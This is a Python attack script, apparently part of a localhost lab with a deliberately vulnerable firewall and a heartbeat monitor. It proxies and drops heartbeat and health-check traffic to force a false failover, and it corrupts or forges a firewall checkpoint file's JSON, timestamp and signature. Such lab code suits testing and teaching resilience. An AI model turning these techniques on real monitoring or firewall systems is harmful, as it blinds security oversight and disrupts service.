import json
import os
import socket
import sys
import threading
import time
from pathlib import Path

# actual ports
REAL_MONITOR_PORT = 9999
REAL_FIREWALL_PORT = 8080

# interception proxy ports
PROXY_MONITOR_PORT = 9998  
PROXY_FIREWALL_PORT = 8070 

MONITOR_HOST = "127.0.0.1"
FIREWALL_HOST = "127.0.0.1"

# path for the checkpoint json
CHECKPOINT_FILE = Path(__file__).parent / "firewall_checkpoint.json"


def run_scenario_1_proxy(attack_active):
    print("[+] Starting Attack Scenario 1: Intercepting Communication Channels...")
    
    # start a proxy socket to void heartbeats
    def intercept_udp():
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as proxy_udp, \
             socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as forward_udp:
            
            proxy_udp.bind((MONITOR_HOST, PROXY_MONITOR_PORT)) 
            
            count = 0
            while True:
                data, addr = proxy_udp.recvfrom(1024)
                if attack_active and count > 5:
                    # drop the packets after letting a few pass
                    pass
                else:
                    # forward the heartbeat data to the real monitor port
                    forward_udp.sendto(data, (MONITOR_HOST, REAL_MONITOR_PORT))
                    count += 1
                    
    def handle_tcp_client(client_conn):
        with client_conn:
            if attack_active:
                # simulate unresponsiveness
                client_conn.close()
            else:
                # open a channel to the real firewall and send data back and forth
                with socket.create_connection((FIREWALL_HOST, REAL_FIREWALL_PORT), timeout=0.5) as real_fw:
                    # read request from the monitor
                    request_data = client_conn.recv(1024)
                    if request_data:
                        real_fw.sendall(request_data)
                        real_fw.shutdown(socket.SHUT_WR)
                        
                        # read the firewalls JSON response
                        response_data = real_fw.recv(2048)
                        if response_data:
                            client_conn.sendall(response_data)
                

    # block TCP health status requests coming from the monitor
    def intercept_tcp():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proxy_tcp:
            proxy_tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            proxy_tcp.bind((FIREWALL_HOST, PROXY_FIREWALL_PORT))
            proxy_tcp.listen(5)
            while True:
                client_conn, _ = proxy_tcp.accept()
                # create a thread per request to handle multiple status connections
                threading.Thread(target=handle_tcp_client, args=(client_conn,), daemon=True).start()

    threading.Thread(target=intercept_udp, daemon=True).start()
    threading.Thread(target=intercept_tcp, daemon=True).start()

    print("\n[!] Setup complete, monitor should now flag a timeout event and start backup")
    
    # start an infinite loop to keep packet interception for as long as needed
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[-] Scenario 1 Stopped.")


def run_scenario_2_tamper(tamper_type):
    print(f"[+] Starting Attack Scenario 2: Tampering with Checkpoint ({tamper_type})...")
    
    def watch_checkpoint_loop():
        while True:
            if CHECKPOINT_FILE.exists():
                # sniff content from the primary proxy handle
                raw_content = CHECKPOINT_FILE.read_text(encoding="utf-8")
                CHECKPOINT_FILE.write_text(raw_content, encoding="utf-8")
                
                if tamper_type == "malformed":
                    corrupted_content = "!!!NOT_VALID_JSON_STRING_DATA!!!\x00\x01\x02"
                    CHECKPOINT_FILE.write_text(corrupted_content, encoding="utf-8")
                
                elif tamper_type == "timestamp":
                    data = json.loads(raw_content)
                    data["saved_at"] = "invalid_string_timestamp"
                    CHECKPOINT_FILE.write_text(json.dumps(data, indent=2), encoding="utf-8")
                
                elif tamper_type == "signature":
                    data = json.loads(raw_content)
                    data["signature"] = "f00dbabe" * 8
                    CHECKPOINT_FILE.write_text(json.dumps(data, indent=2), encoding="utf-8")
            time.sleep(0.2)

    threading.Thread(target=watch_checkpoint_loop, daemon=True).start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[-] Scenario 2 Stopped.")


"""
# DONT REMOVE: in case of need for start-up instructions

# attack_mode variable: True = activate the scenario 1 communication blockage
# attack_mode variable: False = allows regular flow of traffic(only works with --scenario-1)

# scenario 1 execution: python adversary_attack.py --scenario-1
# scenario 2 execution: python adversary_attack.py --scenario-2 [malformed, timestamp, signature] <-(only one of these)

# START-UP ORDER:
Scenario 1: [python adversary_attack.py --scenario-1] --> [python vulnerable_firewall.py] --> [python heartbeat_monitor.py]
Scenario 2: [python vulnerable_firewall.py] --> [python heartbeat_monitor.py] --> [python adversary_attack.py --scenario-2 (malformed, timestamp, signature)]
"""
if __name__ == "__main__":
    scenario = sys.argv[1]
    attack_mode = True

    if scenario == "--scenario-1":
        run_scenario_1_proxy(attack_mode)
    elif scenario == "--scenario-2":
        target_corruption = sys.argv[2]
        if target_corruption in ("malformed", "timestamp", "signature"):
            run_scenario_2_tamper(target_corruption)
        else:
            print("Invalid/Misspelled corruption option")